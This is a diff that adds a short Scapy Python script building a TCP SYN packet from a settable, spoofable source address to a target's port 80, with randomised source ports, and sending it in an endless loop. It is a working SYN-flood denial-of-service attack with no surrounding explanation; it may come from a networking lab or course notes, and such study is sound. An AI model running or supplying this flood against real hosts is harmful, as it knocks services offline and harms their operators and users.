@@ -1,0 +1,16 @@
+----
+a=IP()
+a.proto=6              #specifies that TCP is encapsulated
+a.src="10.10.0.40"    #Any source IP
+a.dst="172.16.82.106"  #Target IP
+
+b=TCP()
+b.sport=RandShort()    #Randomizes Sport
+b.dport=80            #Target Dport
+b.flags="S"            #use SYN flag
+
+a.show()
+b.show()
+
+send(a/b, loop=1, verbose=0)        #loop until ctrl+c
+----
